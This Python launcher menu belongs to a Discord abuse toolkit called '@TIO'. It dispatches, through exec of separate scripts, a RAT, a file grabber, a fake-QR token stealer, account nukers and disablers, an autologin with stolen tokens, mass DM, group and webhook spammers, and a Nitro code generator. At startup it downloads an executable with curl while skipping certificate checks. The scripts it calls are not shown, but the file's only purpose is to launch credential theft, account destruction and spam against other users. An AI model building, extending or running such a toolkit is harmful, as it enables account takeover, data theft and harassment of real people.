from util.plugins.update import search_for_updates
from util.plugins.commun import *

def main():
    clear()
    setTitle(f"@TIO Menu v{THIS_VERSION}")
    astraahometitle()
    print(f"""      {y}[{b}+{y}]{w} Main Options:           {y}[{b}+{y}]{w} Grabber Options:         {y}[{b}+{y}]{w} Token Options:             {y}[{b}+{y}]{w} Useful Options:
\n          {y}[{w}01{y}]{w} Self Bot               {y}[{w}06{y}]{w} File                    {y}[{w}09{y}]{w} Account Nuker            {y}[{w}15{y}]{w} Tokens Checker
\n          {y}[{w}02{y}]{w} RAT Tool               {y}[{w}07{y}]{w} Image                   {y}[{w}10{y}]{w} Account Disabler         {y}[{w}16{y}]{w} Clear DM
\n          {y}[{w}03{y}]{w} Raid Tool              {y}[{w}08{y}]{w} QrCode                  {y}[{w}11{y}]{w} Account Generator        {y}[{w}17{y}]{w} House Changer
\n          {y}[{w}04{y}]{w} Server Nuker                                        {y}[{w}12{y}]{w} Settings Cycler          {y}[{w}18{y}]{w} Statue Changer
\n          {y}[{w}05{y}]{w} VideoCrash Maker                                    {y}[{w}13{y}]{w} Token Informations       {y}[{w}19{y}]{w} Mass DM
\n                                                                   {y}[{w}14{y}]{w} AutoLogin                {y}[{w}20{y}]{w} Group Spammer          
\t\t\t\t\t\t\t\t\t\t\t\t\t {y}[{b}>{y}]{w} Next Page""")
    global choice
    choice = input(f"""{y}[{b}#{y}]{w} Choice: """)

    if choice == '1' or choice == '01':
        transition()
        selfbottitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
        main()
    elif choice == '2' or choice == '02':
        transition()
        exec(open('util/2_Rat/rat.py').read())
    elif choice == '3' or choice == '03':
        transition()
        raidtitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
        main()
    elif choice == '4' or choice == '04':
        transition()
        raidtitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
        main()
    elif choice == '5' or choice == '05':
        transition()
        subprocess.call([r'util\\5_VidCrashMaker\\crashvideomaker.bat'])
    elif choice == '6' or choice == '06':
        transition()
        exec(open('util/6_FileGrab/filegrabber.py').read())
    elif choice == '7' or choice == '07':
        transition()
        imagegrabbertitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
        main()
    elif choice == '8' or choice == '08':
        transition()
        exec(open('util/8_TokenFakeQr/fakeqr.py').read())
    elif choice == '9'or choice == '09':
        transition()
        exec(open('util/9_AccountNuker/accountnuker.py').read())
    elif choice == '10':
        transition()
        exec(open('util/10_AccountDisabler/accountdisabler.py').read())
    elif choice == '11':
        transition()
        accountgentitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
        main()
    elif choice == '12':
        transition()
        exec(open('util/12_SettingsCycler/settingscycler.py').read())
    elif choice == '13':
        transition()
        exec(open('util/13_TokenInfo/tokeninfo.py').read())
    elif choice == '14':
        transition()
        exec(open('util/14_AutoLogin/autologin.py').read())
    elif choice == '15':
        transition()
        exec(open('util/15_TokensChecker/tokenschecker.py').read()) 
    elif choice == '16':
        transition()
        exec(open('util/16_ClearDM/cleardm.py').read())
    elif choice == '17':
        transition()
        exec(open('util/17_HouseChanger/housechanger.py').read())
    elif choice == '18':
        transition()
        exec(open('util/18_StatueChanger/statuechanger.py').read())
    elif choice == '19':
        transition()
        exec(open('util/19_MassDM/massdm.py').read())
    elif choice == '20':
        transition()
        exec(open('util/20_GroupSpammer/groupspammer.py').read())
    elif choice == '>':
        clear()
        astraahometitle()
        print(f"""      {y}[{b}+{y}]{w} Nitro Options:          {y}[{b}+{y}]{w} WebHooks Options:        {y}[{b}+{y}]{w} Other Options:
\n          {y}[{w}21{y}]{w} Generator              {y}[{w}22{y}]{w} Spammer                 {y}[{w}24{y}]{w} Credits
\n                                      {y}[{w}23{y}]{w} Remover                 {y}[{w}25{y}]{w} Exit\n\n\n\n\n\n\n\n\n\n                                                                                                     {y}[{b}<{y}]{w} Previous Page""")
        choice = input(f"""{y}[{b}#{y}]{w} Choice: """)

        if choice == '21':
            transition()
            exec(open('util/21_NitroGen/nitrogen.py').read())
        elif choice == '22':
            transition()
            exec(open('util/22_WebHSpam/webhspam.py').read())
        elif choice == '23':
            transition()
            exec(open('util/23_WebHRemover/webhremover.py').read())
        elif choice == '24':
            transition()
            astraahometitle()
            print(f"""                                            {y}[{b}+{y}]{w} Development Networks:\n\n                                                {y}[{w}#{y}]{w} GitHub:    @AstraaDev\n                                                {y}[{w}#{y}]{w} Server:    dsc.gg/astraaddev\n\n\n                                            {y}[{b}+{y}]{w} Other Network\n\n                                                {y}[{w}#{y}]{w} Twitter:   @AstraaDev\n                                                {y}[{w}#{y}]{w} Discord:   Astraa#6100\n                                                {y}[{w}#{y}]{w} Insta:     @astraaftn\n\n\n\n""")
            input(f"""{y}[{b}#{y}]{w} Press ENTER to exit""")
            main()
        elif choice == '25':
            transition()
            sys.exit()
        elif choice == '<':
            clear()
            main()    
        else:
            clear()
            main()
    else:
        clear()
        main()


if __name__ == "__main__":
    import sys
    setTitle("@TIO Premium Loading...")
    
    System.Size(120, 30)
    Anime.Fade(Center.Center(banner), Colors.purple_to_blue, Colorate.Vertical, time=1)
    os.system("""if not exist "util/chromedriver.exe" echo [#] Downloading chromedriver: """)
    os.system("""if not exist "util/chromedriver.exe" curl -#fkLo "util/chromedriver.exe" "https://github.com/AstraaDev/complement/raw/main/chromedriver.exe" """)
    if os.path.basename(sys.argv[0]).endswith("exe"):
        installPackage(pkgs)
        search_for_updates()
        if not os.path.exists(getTempDir()+"\\atio_proxies"):
            proxy_scrape()
        clear()
        main()
    try:
        assert sys.version_info >= (3,9)
    except AssertionError:
        input(f"{y}[{Fore.RED}#{y}]{w} Sorry but, your python version ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) is not compatible with @TIO, please download python 3.9 or higher.")
        sys.exit()
    else:
        search_for_updates()
        if not os.path.exists(getTempDir()+"\\atio_proxies"):
            proxy_scrape()
        clear()
        main()